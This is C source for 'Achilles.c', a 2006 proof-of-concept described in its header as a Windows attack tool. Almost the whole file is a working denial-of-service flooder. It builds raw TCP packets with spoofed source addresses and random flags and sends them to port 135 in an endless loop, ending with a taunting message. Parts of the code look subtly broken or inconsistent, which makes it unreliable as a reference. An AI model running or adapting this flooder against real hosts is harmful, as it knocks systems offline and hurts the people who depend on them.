/*
 * Achilles.c version2
 * Remodified Achilles Windows Attack Tool
 * compiled on FreeBSD 6.1, SuSE 10
 * Solaris 10, NetBSD 3.0,
 * Proof of Concept tool that disconnects
 * Windows machines until the program is
 * stopped. Tested locally and remotely.
 *
 * linux:~ # uname -a
 * Linux linux 2.6.13-15.10-default #1 Fri May 12 16:27:12 UTC 2006 i386 GNU/Linux
 *
 * $ uname -a
 * SunOS unknown 5.10 Generic_118822-25 sun4u sparc SUNW,Sun-Fire-280R
 *
 * -bash2-2.05b$ uname -a
 * FreeBSD hypnos 5.4-RELEASE-p14 FreeBSD 5.4-RELEASE-p14 #1: Thu May 11 01:34:54 CDT 2006 toor@hypnos:/usr/obj/usr/src/sys/HYPNOS  i386
 *
 * (c) 2006 J. Oquendo Genexsys.net::Infiltrated.net
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>

#ifndef __USE_BSD
#define __USE_BSD

#endif

#ifndef __FAVOR_BSD

#define __FAVOR_BSD

#endif

#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>

#ifdef LINUX
#define FIX(x) htons(x)

#else

#define FIX(x) (x)
#endif

struct ip_hdr {
    u_int ip_hl:4,
                ip_v:4;
    u_char ip_tos;
    u_short ip_len;
    u_short ip_id;
    u_short ip_off;
    u_char ip_ttl;
    u_char ip_p;
    u_short ip_sum;
    u_long saddr, daddr;
};

struct tcp_hdr {
    u_short th_sport;
    u_short th_dport;
    u_long th_seq;
    u_long th_syn;
    u_int th_x2:4,
                th_off:4;
    u_char th_flags;
    u_short th_win;
    u_short th_sum;
    u_short th_urp;
};

struct tcpopt_hdr {
    u_char type;
    u_char len;
    u_short value;
};

struct pseudo_hdr {
    u_long saddr, daddr;
    u_char mbz, ptcl;
    u_short tcpl;
};

struct packet {
    struct ip/*_hdr*/ ip;
    struct tcphdr tcp;
};

struct cksum {
    struct pseudo_hdr pseudo;
    struct tcphdr tcp;
};

struct packet packet;
struct cksum cksum;
struct sockaddr_in s_in;
u_short bgport, bgsize, pps;
u_long radd;
u_long sradd;
int sock;

void usage(char *progname)
{
    fprintf(stderr, "Usage: %s <dst> <src> <size> <number>\n", progname);
    fprintf(stderr, "dst:\tDestination Address\n");
    fprintf(stderr, "src:\tSource Address\n");
    fprintf(stderr, "size:\tSize of packet\n");
    fprintf(stderr, "num:\tpackets\n\n");
    exit(1);
}

inline u_short in_cksum(u_short *addr, int len)
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
     while (nleft > 1) {
         sum += *w++;
         nleft -= 2;
     }
     if (nleft == 1) {
         *(u_char *)(&answer) = *(u_char *) w;
         sum += answer;
     }
     sum = (sum >> 16) + (sum & 0xF0F0);
     sum += (sum >> 16);
     answer = ~sum;
     return(answer);
}

u_long lookup(char *hostname)
{
    struct hostent *hp;

    if ((hp = gethostbyname(hostname)) == NULL) {
       fprintf(stderr, "Could not resolve %s\n", hostname);
       exit(1);
    }

    return *(u_long *)hp->h_addr;
}

void flooder(void)
{
    struct timespec ts;
    int i;

    memset(&packet, 0, sizeof(packet));

    ts.tv_sec = 0;
    ts.tv_nsec = 100;

    packet.ip.ip_hl = 5;
    packet.ip.ip_v = 4;
    packet.ip.ip_p = IPPROTO_TCP;
    packet.ip.ip_tos = 0xa0;
    packet.ip.ip_id = radd;
    packet.ip.ip_len = FIX(sizeof(packet));
    packet.ip.ip_off = 0;
    packet.ip.ip_ttl = 255;
    packet.ip.ip_dst.s_addr = radd;

    packet.tcp.th_flags = 0;
    packet.tcp.th_win = 65535;
    packet.tcp.th_seq = random();
    packet.tcp.th_ack = 0;
    packet.tcp.th_off = random();
    packet.tcp.th_urp = 0;
    packet.tcp.th_dport = 135;
    cksum.pseudo.daddr = sradd;
    cksum.pseudo.mbz = random(); /* WATCH ME CLOSELY */
    cksum.pseudo.ptcl = IPPROTO_TCP;
    cksum.pseudo.tcpl = random();

    s_in.sin_family = AF_INET;
    s_in.sin_addr.s_addr = sradd;
    s_in.sin_port = 135;

    for(i=0;;++i) {
    if( !(i&31337) ) {
        packet.tcp.th_sport = 135;
        cksum.pseudo.saddr = packet.ip.ip_src.s_addr = sradd;
        packet.tcp.th_flags = random();
        packet.tcp.th_ack = random();

    }
    else {
        packet.tcp.th_flags = rand();
        packet.tcp.th_ack = rand();
    }
       ++packet.ip.ip_id;
       /*++packet.tcp.th_sport*/;
       ++packet.tcp.th_seq;

       if (!bgport)
          s_in.sin_port = packet.tcp.th_dport = 135;

       packet.ip.ip_sum = 0;
       packet.tcp.th_sum = 0;

       cksum.tcp = packet.tcp;

       packet.ip.ip_sum = in_cksum((void *)&packet.ip, 20);
       packet.tcp.th_sum = in_cksum((void *)&cksum, sizeof(cksum));

       if (sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr *)&s_in, sizeof(s_in)) < 0);

    }
}

int main(int argc, char *argv[])
{
    int on = 1;

    printf("Achilles.c Windows Attack Tool\n");


    if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
       perror("socket");
       exit(1);
    }

    setgid(getgid()); setuid(getuid());

    if (argc < 4)
       usage(argv[0]);

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0) {
       perror("setsockopt");
       exit(1);

    }

    srand((time(NULL) ^ getpid()) + getppid());

    printf("\nFinding host\n"); fflush(stdout);

    radd = lookup(argv[1]);
    bgport = atoi(argv[3]);
    bgsize = atoi(argv[4]);
    sradd = lookup(argv[2]);
    printf("Achilles: Before my time is done I will look down on your corpse and smile.\n");

    flooder();

    return 0;
}
